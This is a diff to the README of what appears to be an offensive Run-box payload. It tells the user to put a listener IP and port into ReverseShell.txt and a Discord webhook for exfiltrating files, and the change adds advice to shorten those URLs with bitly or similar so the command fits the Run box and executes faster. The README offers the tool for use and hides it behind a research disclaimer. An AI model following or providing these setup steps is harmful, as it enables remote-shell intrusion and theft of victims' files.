@@ -18,9 +18,11 @@ $ run
 2. Insert the IP address and Port of your listener into the ReverseShell.txt file
 3. Insert discord webhook for exfiltrating files to such in the ReverseShell.txt
 
-• use a url shortener for the links in ReverseShell.txt
+# Shorten URLs
+shorten the url and your webhook in ReverseShell.txt
   - stays in run box char limit
   - faster execution
+  - bitly or any service will work
 
 # Disclaimer
 I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.
